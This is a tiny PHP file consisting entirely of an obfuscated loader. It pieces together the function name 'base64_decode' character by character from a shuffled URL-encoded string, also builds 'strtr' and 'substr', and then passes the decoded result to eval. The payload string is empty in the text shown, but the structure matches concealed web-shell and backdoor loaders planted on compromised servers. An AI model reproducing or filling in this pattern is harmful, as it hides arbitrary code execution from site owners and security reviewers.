<?php 
$HJUZJIAMIHEN=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$ZWZD=$HJUZJIAMIHEN{3}.$HJUZJIAMIHEN{6}.$HJUZJIAMIHEN{33}.$HJUZJIAMIHEN{30};$JISHUTUANDUIPMS=$HJUZJIAMIHEN{33}.$HJUZJIAMIHEN{10}.$HJUZJIAMIHEN{24}.$HJUZJIAMIHEN{10}.$HJUZJIAMIHEN{24};$CWANGLUOGONGSI=$JISHUTUANDUIPMS{0}.$HJUZJIAMIHEN{18}.$HJUZJIAMIHEN{3}.$JISHUTUANDUIPMS{0}.$JISHUTUANDUIPMS{1}.$HJUZJIAMIHEN{24};$BXINXIJIAOLOU=$HJUZJIAMIHEN{7}.$HJUZJIAMIHEN{13};$ZWZD.=$HJUZJIAMIHEN{22}.$HJUZJIAMIHEN{36}.$HJUZJIAMIHEN{29}.$HJUZJIAMIHEN{26}.$HJUZJIAMIHEN{30}.$HJUZJIAMIHEN{32}.$HJUZJIAMIHEN{35}.$HJUZJIAMIHEN{26}.$HJUZJIAMIHEN{30};eval($ZWZD(""));
 ?>